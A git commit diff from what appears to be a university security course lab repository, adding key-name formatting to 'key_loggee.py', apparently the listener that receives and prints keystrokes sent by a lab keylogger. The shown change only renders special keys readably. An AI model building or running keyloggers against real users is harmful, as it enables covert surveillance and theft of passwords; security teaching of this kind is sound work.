76b49a0401efb98050edfa8f0f55e515877894fd
uwacyber <98138371+uwacyber@users.noreply.github.com>
2022-07-22 14:14:23 +0800

    Update key_loggee.py

--- cits3006-labs/files/key_loggee.py
+++ cits3006-labs/files/key_loggee.py
@@ -24,5 +24,27 @@ while True:
         data = ' '
     if str(data) == 'Key.enter':
         data = '\n'
+    if str(data) == 'Key.tab':
+        data = '\t'
+    if str(data) == 'Key.backspace':
+        data = ' [backspace] '
+    if str(data) == 'Key.shift' or str(data) == 'Key.shift_r':
+        data = ''
+    if str(data) == 'Key.ctrl' or str(data) == 'Key.ctrl_r':
+        data = ' [ctrl] '
+    if str(data) == 'Key.alt' or str(data) == 'Key.alt_r':
+        data = ' [alt] '
+    if str(data) == 'Key.cmd' or str(data) == 'Key.cmd_r':
+        data = ' [cmd] '
+    if str(data) == 'Key.caps_lock':
+        data = ' [caps lock] '
+    if str(data) == 'Key.left':
+        data = ' [left] '
+    if str(data) == 'Key.right':
+        data = ' [right] '
+    if str(data) == 'Key.up':
+        data = ' [up] '
+    if str(data) == 'Key.down':
+        data = ' [down] '
     print(str(data).strip("'"), end='', flush=True)
 conn.close()
